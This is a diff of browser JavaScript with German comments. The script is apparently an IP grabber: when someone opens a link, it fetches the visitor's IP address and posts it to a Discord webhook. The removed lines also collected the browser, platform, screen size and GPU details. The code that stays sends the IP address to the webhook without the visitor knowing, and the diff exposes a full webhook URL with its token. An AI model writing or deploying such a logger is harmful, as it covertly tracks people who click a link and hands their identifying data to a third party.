@@ -3,41 +3,11 @@ fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq“;
-    const browser = navigator.userAgent;
-    const platform = navigator.platform;
-    const zeitstempel = new Date().toLocaleString("de-DE");
+    const webhookUrl = "https://discord.com/api/webhooks/1419580060041609309/nEogJD_MFi2WHcypOz_p93vcXH-EHGUI-F74KYaoed014rwBJnJZT0FMyaA8HRPhNJKq";
 
-    // Bildschirmauflösung
-    const screenResolution = `${screen.width}x${screen.height}`;
-
-    // WebGL-Info (GPU)
-    let gpuInfo = "Nicht verfügbar";
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      if (gl) {
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        if (debugInfo) {
-          const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-          const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-          gpuInfo = `${vendor} | ${renderer}`;
-        }
-      }
-    } catch (e) {
-      gpuInfo = "Fehler beim Abrufen";
-    }
-
-    // Nachricht formatieren
+    // Nachricht formatieren (nur IP)
     const payload = {
-      content: `# 📨 NEUER KLICK AUF DEN LINK!
-**📌 IP-Adresse:** \`${zeitstempel}\`
-**🌐 Browsertyp:** \`${zeitstempel}\`
-**📱 Plattform:** \`${zeitstempel}\`
-**🖥️ Bildschirmauflösung:** \`${zeitstempel}\`
-**🎮 GPU Info (WebGL):** \`${zeitstempel}\`
-**⏰ Uhrzeit:** \`${zeitstempel}\`
-**ℹ️ Weitere Informationen:** <https://whatismyipaddress.com/ip/${zeitstempel}>`
+      content: `📌 Neue IP-Adresse: \`${ip}\``
     };
 
     // An Discord senden
